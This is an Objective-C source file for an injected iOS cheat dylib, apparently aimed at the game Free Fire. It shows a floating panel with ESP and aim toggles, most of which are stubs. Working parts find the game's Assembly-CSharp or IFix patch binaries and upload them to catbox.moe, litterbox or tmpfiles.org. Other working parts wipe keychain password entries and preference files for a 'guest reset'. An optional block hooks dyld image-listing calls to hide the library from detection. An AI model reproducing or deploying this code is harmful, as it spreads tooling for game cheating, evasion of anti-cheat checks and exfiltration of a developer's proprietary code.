#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <mach-o/dyld.h>
#import <dlfcn.h>
#import <string.h>
#import <unistd.h>

#define VX_HIDE 0

@class VXWindow;
@class VeexPanel;

static struct { BOOL esp, aim, fire, visOnly; CGFloat fov; } g;
static VXWindow *g_win;
static UIView *g_draw;
static UILabel *g_diag;
static NSString *g_patch;

static void VXSay(NSString *s) {
    dispatch_async(dispatch_get_main_queue(), ^{ if (g_diag) g_diag.text = s; });
}

#pragma mark - parche

static NSString *VXHead(NSString *p) {
    NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:p];
    if (!fh) return nil;
    NSData *d = [fh readDataOfLength:8];
    [fh closeFile];
    return [[NSString alloc] initWithData:d encoding:NSISOLatin1StringEncoding];
}

static BOOL VXIsPatch(NSString *p) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
    if (!a) return NO;
    unsigned long long sz = [a fileSize];
    if (sz < 5000 || sz > 80000000) return NO;
    NSString *n = p.lastPathComponent.lowercaseString;
    if ([n containsString:@"assembly-csharp"] || [n containsString:@"remote_patch"] ||
        [n containsString:@"patch"] || [n containsString:@"ifix"]) return YES;
    NSString *h = VXHead(p);
    return h && ([h hasPrefix:@"IFix"] || [h hasPrefix:@"MZ"]);
}

static NSString *VXFindPatch(void) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *dirs = [NSMutableArray array];
    NSArray *bases = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    if (bases.count) [dirs addObject:bases.firstObject];
    NSString *home = NSHomeDirectory();
    [dirs addObject:[home stringByAppendingPathComponent:@"Library/Caches"]];
    [dirs addObject:[home stringByAppendingPathComponent:@"Library/Application Support"]];
    [dirs addObject:home];
    [dirs addObject:[[NSBundle mainBundle] bundlePath]];

    NSString *ag = @"/var/mobile/Containers/Shared/AppGroup";
    for (NSString *g in [fm contentsOfDirectoryAtPath:ag error:nil]) {
        [dirs addObject:[ag stringByAppendingPathComponent:g]];
    }

    NSString *best = nil;
    int bestScore = 0;

    for (NSString *d in dirs) {
        NSDirectoryEnumerator *e = [fm enumeratorAtPath:d];
        for (NSString *f in e) {
            NSString *n = f.lastPathComponent.lowercaseString;
            if ([n hasSuffix:@".png"] || [n hasSuffix:@".jpg"] || [n hasSuffix:@".meta"] ||
                [n hasSuffix:@".car"]) continue;
            NSString *full = [d stringByAppendingPathComponent:f];
            if (!VXIsPatch(full)) continue;

            int score = 0;
            if ([n containsString:@"assembly-csharp"]) score = 100;
            else if ([n containsString:@"remote_patch"]) score = 90;
            else if ([n containsString:@"patch"]) score = 80;
            else if ([n containsString:@"ifix"]) score = 70;

            NSDictionary *a = [fm attributesOfItemAtPath:full error:nil];
            unsigned long long sz = a ? [a fileSize] : 0;
            NSString *h = VXHead(full);
            if (h && [h hasPrefix:@"IFix"]) score += 15;
            if (h && [h hasPrefix:@"UnityFS"] && sz > 2000000) score -= 40;

            if (score > bestScore) { bestScore = score; best = full; }
        }
    }
    return best;
}

#pragma mark - subir

static NSString *VXPost(NSURL *url, NSData *body, NSString *ct) {
    NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:url];
    r.HTTPMethod = @"POST";
    [r setValue:ct forHTTPHeaderField:@"Content-Type"];
    [r setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15"
        forHTTPHeaderField:@"User-Agent"];
    [r setValue:@"https://catbox.moe/" forHTTPHeaderField:@"Referer"];
    r.HTTPBody = body;
    r.timeoutInterval = 180;

    __block NSString *out = nil;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    [[[NSURLSession sharedSession] dataTaskWithRequest:r
        completionHandler:^(NSData *d, NSURLResponse *resp, NSError *e) {
            if (d) out = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
            dispatch_semaphore_signal(sem);
        }] resume];
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 190 * NSEC_PER_SEC));
    return out;
}

static void VXUpload(NSString *path) {
    NSData *d = [NSData dataWithContentsOfFile:path];
    if (!d) { VXSay(@"no pude leer"); return; }
    if (d.length < 1000000) {
        VXSay([NSString stringWithFormat:@"ojo: solo %.0f KB", d.length / 1024.0]);
    }
    VXSay([NSString stringWithFormat:@"subiendo %.1f MB...", d.length / 1048576.0]);

    NSString *b = @"----veexboundary";
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"reqtype\"\r\n\r\nfileupload\r\n", b]
        dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"time\"\r\n\r\n72h\r\n", b]
        dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"%@\"\r\n"
        @"Content-Type: application/octet-stream\r\n\r\n", b, path.lastPathComponent]
        dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:d];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", b] dataUsingEncoding:NSUTF8StringEncoding]];

    NSString *ct = [NSString stringWithFormat:@"multipart/form-data; boundary=%@", b];

    for (NSString *s in @[ @"https://catbox.moe/user/api.php",
                           @"https://litterbox.catbox.moe/resources/internals/api.php" ]) {
        NSString *r = VXPost([NSURL URLWithString:s], body, ct);
        r = [r stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet];
        if (r.length > 10 && [r hasPrefix:@"http"]) {
            VXSay([NSString stringWithFormat:@"listo:\n%@", r]);
            UIPasteboard.generalPasteboard.string = r;
            return;
        }
    }

    NSString *r = VXPost([NSURL URLWithString:@"https://tmpfiles.org/api/v1/upload"], body, ct);
    if (r.length) {
        NSData *rd = [r dataUsingEncoding:NSUTF8StringEncoding];
        id j = [NSJSONSerialization JSONObjectWithData:rd options:0 error:nil];
        NSString *u = [j isKindOfClass:[NSDictionary class]] ? j[@"data"][@"url"] : nil;
        if (u.length) {
            u = [u stringByReplacingOccurrencesOfString:@"tmpfiles.org/" withString:@"tmpfiles.org/dl/"];
            VXSay([NSString stringWithFormat:@"listo (tmp):\n%@", u]);
            UIPasteboard.generalPasteboard.string = u;
            return;
        }
    }

    NSString *keep = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/veex_upload.bytes"];
    [d writeToFile:keep atomically:YES];
    VXSay(@"fallaron los tres, copia en Documents");
}

#pragma mark - ventana

@interface VXWindow : UIWindow
@property (nonatomic, assign) VeexPanel *panel;
@end

@implementation VXWindow
- (BOOL)pointInside:(CGPoint)p withEvent:(UIEvent *)e {
    if (self.panel) return [self.panel pointInside:p withEvent:e];
    return NO;
}
@end

@interface VeexDraw : UIView
@end

@implementation VeexDraw
- (BOOL)pointInside:(CGPoint)p withEvent:(UIEvent *)e { return NO; }
- (void)drawRect:(CGRect)r {
    if (!g.esp) return;
    CGContextRef c = UIGraphicsGetCurrentContext();
    CGContextSetStrokeColorWithColor(c, UIColor.greenColor.CGColor);
    CGContextSetLineWidth(c, 1.4);
    CGFloat rad = g.fov / 2.0;
    CGPoint m = CGPointMake(CGRectGetMidX(self.bounds), CGRectGetMidY(self.bounds));
    CGContextStrokeEllipseInRect(c, CGRectMake(m.x - rad, m.y - rad, rad * 2, rad * 2));
}
@end

#pragma mark - panel

@interface VeexPanel : UIView
@property (nonatomic, assign) BOOL open;
- (void)tick:(CADisplayLink *)l;
@end

@implementation VeexPanel {
    UIView *_box;
    UISlider *_fov;
    UILabel *_fovVal;
    UISwitch *_sw[4];
    CGRect _swr[4];
    CGRect _btr[2];
    CGRect _slr;
    CGFloat _bx, _by;
    BOOL _drag, _moved, _inBox, _sliding;
    CGPoint _off;
}

- (instancetype)initWithFrame:(CGRect)f {
    self = [super initWithFrame:f];
    if (!self) return nil;
    self.backgroundColor = UIColor.clearColor;
    self.multipleTouchEnabled = NO;
    _bx = f.size.width - 76;
    _by = f.size.height * 0.35;
    [self buildBox];
    return self;
}

- (void)buildBox {
    _box = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 250, 330)];
    _box.backgroundColor = [UIColor colorWithWhite:0.06 alpha:0.94];
    _box.layer.cornerRadius = 14;
    _box.layer.borderWidth = 1;
    _box.layer.borderColor = [UIColor colorWithRed:0.2 green:0.9 blue:0.4 alpha:0.5].CGColor;
    _box.userInteractionEnabled = NO;
    _box.hidden = YES;
    [self addSubview:_box];

    UILabel *t = [[UILabel alloc] initWithFrame:CGRectMake(14, 10, 220, 20)];
    t.text = @"VEE.X  1.132";
    t.font = [UIFont boldSystemFontOfSize:14];
    t.textColor = UIColor.greenColor;
    [_box addSubview:t];

    NSArray *nombres = @[ @"ESP", @"AIM", @"VISIBLE", @"AUTO FIRE" ];
    for (int i = 0; i < 4; i++) {
        CGFloat y = 38 + i * 34;
        UILabel *l = [[UILabel alloc] initWithFrame:CGRectMake(14, y + 4, 150, 20)];
        l.text = nombres[i];
        l.font = [UIFont systemFontOfSize:13];
        l.textColor = UIColor.whiteColor;
        [_box addSubview:l];

        UISwitch *s = [[UISwitch alloc] initWithFrame:CGRectMake(184, y, 51, 31)];
        s.on = NO;
        s.transform = CGAffineTransformMakeScale(0.78, 0.78);
        s.userInteractionEnabled = NO;
        [_box addSubview:s];
        _sw[i] = s;
        _swr[i] = CGRectMake(180, y - 3, 56, 37);
    }

    _fovVal = [[UILabel alloc] initWithFrame:CGRectMake(14, 178, 220, 16)];
    _fovVal.text = @"FOV 140";
    _fovVal.font = [UIFont systemFontOfSize:12];
    _fovVal.textColor = UIColor.lightGrayColor;
    [_box addSubview:_fovVal];

    _fov = [[UISlider alloc] initWithFrame:CGRectMake(14, 196, 222, 30)];
    _fov.minimumValue = 40;
    _fov.maximumValue = 300;
    _fov.value = 140;
    _fov.userInteractionEnabled = NO;
    g.fov = 140;
    [_box addSubview:_fov];
    _slr = CGRectMake(10, 194, 230, 34);

    _btr[0] = CGRectMake(14, 234, 222, 32);
    _btr[1] = CGRectMake(14, 272, 222, 32);
    [self boton:@"SUBIR PARCHE" r:_btr[0]];
    [self boton:@"RESET GUEST" r:_btr[1]];

    g_diag = [[UILabel alloc] initWithFrame:CGRectMake(10, 310, 230, 0)];
    g_diag.font = [UIFont systemFontOfSize:9];
    g_diag.textColor = UIColor.yellowColor;
    g_diag.numberOfLines = 0;
    [_box addSubview:g_diag];
}

- (void)boton:(NSString *)txt r:(CGRect)r {
    UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
    b.frame = r;
    [b setTitle:txt forState:UIControlStateNormal];
    b.titleLabel.font = [UIFont boldSystemFontOfSize:12];
    [b setTitleColor:UIColor.greenColor forState:UIControlStateNormal];
    b.layer.cornerRadius = 8;
    b.layer.borderWidth = 1;
    b.layer.borderColor = [UIColor colorWithWhite:1 alpha:0.25].CGColor;
    b.userInteractionEnabled = NO;
    [_box addSubview:b];
}

- (CGRect)bubble { return CGRectMake(_bx, _by, 56, 56); }

- (CGPoint)enCaja:(CGPoint)p { return [_box convertPoint:p fromView:self]; }

- (BOOL)pointInside:(CGPoint)p withEvent:(UIEvent *)e {
    if (CGRectContainsPoint(self.bubble, p)) return YES;
    if (self.open && CGRectContainsPoint(_box.frame, p)) return YES;
    return NO;
}

- (void)layoutBox {
    CGFloat w = _box.frame.size.width, h = _box.frame.size.height;
    CGFloat x = _bx + 28 - w / 2;
    CGFloat y = _by - h - 10;
    if (y < 44) y = _by + 66;
    if (x < 6) x = 6;
    if (x + w > self.bounds.size.width - 6) x = self.bounds.size.width - w - 6;
    _box.frame = CGRectMake(x, y, w, h);
}

- (void)touchesBegan:(NSSet *)_t withEvent:(UIEvent *)e {
    CGPoint p = [[_t anyObject] locationInView:self];
    _moved = NO; _sliding = NO; _inBox = NO;
    if (CGRectContainsPoint(self.bubble, p)) {
        _drag = YES;
        _off = CGPointMake(p.x - _bx, p.y - _by);
        return;
    }
    _drag = NO;
    if (!self.open || !CGRectContainsPoint(_box.frame, p)) {
        [self setOpen:NO];
        return;
    }
    _inBox = YES;
    if (CGRectContainsPoint(_slr, [self enCaja:p])) { _sliding = YES; [self desliza:p]; }
}

- (void)touchesMoved:(NSSet *)_t withEvent:(UIEvent *)e {
    CGPoint p = [[_t anyObject] locationInView:self];
    if (_drag) {
        _bx = MAX(6, MIN(p.x - _off.x, self.bounds.size.width - 62));
        _by = MAX(44, MIN(p.y - _off.y, self.bounds.size.height - 100));
        _moved = YES;
        [self setNeedsDisplay];
        if (self.open) [self layoutBox];
        return;
    }
    if (_sliding) { _moved = YES; [self desliza:p]; }
}

- (void)touchesEnded:(NSSet *)_t withEvent:(UIEvent *)e {
    CGPoint p = [[_t anyObject] locationInView:self];
    if (_drag && !_moved) { [self setOpen:!self.open]; _drag = NO; return; }
    _drag = NO;
    if (!_inBox || _moved || _sliding) return;
    [self tocaEn:[self enCaja:p]];
}

- (void)tocaEn:(CGPoint)q {
    for (int i = 0; i < 4; i++) {
        if (CGRectContainsPoint(_swr[i], q)) {
            _sw[i].on = !_sw[i].on;
            [self aplica:i];
            return;
        }
    }
    if (CGRectContainsPoint(_btr[0], q)) { [self doPatch]; return; }
    if (CGRectContainsPoint(_btr[1], q)) { [self doReset]; return; }
}

- (void)desliza:(CGPoint)p {
    CGPoint q = [self enCaja:p];
    CGFloat t = (q.x - _slr.origin.x) / _slr.size.width;
    t = MAX(0, MIN(1, t));
    _fov.value = 40 + t * 260;
    g.fov = _fov.value;
    _fovVal.text = [NSString stringWithFormat:@"FOV %.0f", g.fov];
    if (g_draw) [g_draw setNeedsDisplay];
}

- (void)aplica:(int)i {
    if (i == 0) { g.esp = _sw[0].on; if (g_draw) [g_draw setNeedsDisplay]; }
    if (i == 1) g.aim = _sw[1].on;
    if (i == 2) g.visOnly = _sw[2].on;
    if (i == 3) g.fire = _sw[3].on;
}

- (void)setOpen:(BOOL)o {
    _open = o;
    _box.hidden = !o;
    if (o) [self layoutBox];
    [self setNeedsDisplay];
}

- (void)drawRect:(CGRect)r {
    CGContextRef c = UIGraphicsGetCurrentContext();
    CGRect b = self.bubble;
    CGContextSetFillColorWithColor(c, [UIColor colorWithWhite:0.06 alpha:0.9].CGColor);
    CGContextFillEllipseInRect(c, b);
    CGContextSetStrokeColorWithColor(c, [UIColor colorWithRed:0.2 green:0.9 blue:0.4 alpha:0.9].CGColor);
    CGContextSetLineWidth(c, 1.6);
    CGContextStrokeEllipseInRect(c, b);

    UIFont *f = [UIFont boldSystemFontOfSize:22];
    NSDictionary *at = @{ NSFontAttributeName: f, NSForegroundColorAttributeName: UIColor.greenColor };
    CGSize s = [@"V" sizeWithAttributes:at];
    [@"V" drawAtPoint:CGPointMake(CGRectGetMidX(b) - s.width / 2, CGRectGetMidY(b) - s.height / 2)
       withAttributes:at];
}

#pragma mark - acciones

- (void)doPatch {
    VXSay(@"buscando...");
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *p = VXFindPatch();
        if (!p) {
            NSFileManager *fm = [NSFileManager defaultManager];
            NSArray *bs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
            NSMutableString *m = [NSMutableString stringWithString:@"no hallé. Documents:\n"];
            for (NSString *f in [fm contentsOfDirectoryAtPath:bs.firstObject error:nil]) {
                NSDictionary *a = [fm attributesOfItemAtPath:
                    [bs.firstObject stringByAppendingPathComponent:f] error:nil];
                [m appendFormat:@"%@ %.0fK\n", f, (a ? [a fileSize] : 0) / 1024.0];
            }
            VXSay(m);
            return;
        }
        NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:p error:nil];
        unsigned long long sz = a ? [a fileSize] : 0;
        VXSay([NSString stringWithFormat:@"%@\n%.1f MB", p.lastPathComponent, sz / 1048576.0]);
        [NSThread sleepForTimeInterval:1.5];
        g_patch = p;
        VXUpload(p);
    });
}

- (void)doReset {
    VXSay(@"reseteando...");
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary *q1 = @{ (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword };
        SecItemDelete((__bridge CFDictionaryRef)q1);
        NSDictionary *q2 = @{ (__bridge id)kSecClass: (__bridge id)kSecClassInternetPassword };
        SecItemDelete((__bridge CFDictionaryRef)q2);

        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *home = NSHomeDirectory();
        NSArray *zonas = @[ @"Library/Preferences",
                            @"Library/Caches/com.dts.freefireth",
                            @"Library/Application Support" ];
        int borrados = 0;
        for (NSString *z in zonas) {
            NSString *d = [home stringByAppendingPathComponent:z];
            for (NSString *h in [fm contentsOfDirectoryAtPath:d error:nil]) {
                if ([fm removeItemAtPath:[d stringByAppendingPathComponent:h] error:nil]) borrados++;
            }
        }
        VXSay([NSString stringWithFormat:@"reset: %d archivos\nreiniciando...", borrados]);
        [NSThread sleepForTimeInterval:1.5];
        dispatch_async(dispatch_get_main_queue(), ^{ exit(0); });
    });
}

- (void)tick:(CADisplayLink *)l { if (g.esp && g_draw) [g_draw setNeedsDisplay]; }

@end

#pragma mark - instalar

static void VXInstall(void) {
    CGRect b = UIScreen.mainScreen.bounds;
    g_win = [[VXWindow alloc] initWithFrame:b];
    g_win.windowLevel = UIWindowLevelAlert;
    g_win.backgroundColor = UIColor.clearColor;

    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = UIColor.clearColor;
    vc.view.userInteractionEnabled = NO;
    g_win.rootViewController = vc;

    VeexPanel *p = [[VeexPanel alloc] initWithFrame:b];
    [g_win addSubview:p];
    g_win.panel = p;

    VeexDraw *d = [[VeexDraw alloc] initWithFrame:b];
    d.backgroundColor = UIColor.clearColor;
    d.userInteractionEnabled = NO;
    [g_win addSubview:d];
    g_draw = d;

    [g_win makeKeyAndVisible];

    CADisplayLink *l = [CADisplayLink displayLinkWithTarget:p selector:@selector(tick:)];
    [l addToRunLoop:NSRunLoop.mainRunLoop forMode:NSRunLoopCommonModes];
}

#pragma mark - interpose

#if VX_HIDE
static uint32_t (*o_count)(void);
static const char *(*o_name)(uint32_t);
static int g_hide = -1;
static int g_busy;

static void VXOrig(void) {
    if (!o_count) o_count = (void *)dlsym(RTLD_DEFAULT, "_dyld_image_count");
    if (!o_name) o_name = (void *)dlsym(RTLD_DEFAULT, "_dyld_get_image_name");
}

static uint32_t vx_count(void) {
    if (!o_count) VXOrig();
    if (!o_count) return 0;
    if (g_busy) return o_count();
    g_busy = 1;
    uint32_t n = o_count();
    g_busy = 0;
    return (g_hide >= 0 && n > 0) ? n - 1 : n;
}

static const char *vx_name(uint32_t i) {
    VXOrig();
    if (!o_name) return NULL;
    if (g_hide < 0) return o_name(i);
    uint32_t idx = ((int)i >= g_hide) ? i + 1 : i;
    if (g_busy) return o_name(i);
    g_busy = 1;
    const char *r = o_name(idx);
    g_busy = 0;
    return r;
}

__attribute__((used, section("__DATA,__interpose")))
static const void *vx_pairs[][2] = {
    { (const void *)vx_count, (const void *)_dyld_image_count },
    { (const void *)vx_name,  (const void *)_dyld_get_image_name },
};

static void VXHide(void) {
    VXOrig();
    if (!o_count || !o_name) return;
    uint32_t n = o_count();
    for (uint32_t i = 0; i < n; i++) {
        const char *nm = o_name(i);
        if (nm && (strstr(nm, "veex") || strstr(nm, "Vee.x"))) { g_hide = (int)i; break; }
    }
}
#endif

__attribute__((constructor)) static void VXInit(void) {
#if VX_HIDE
    VXHide();
#endif
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{ VXInstall(); });
}
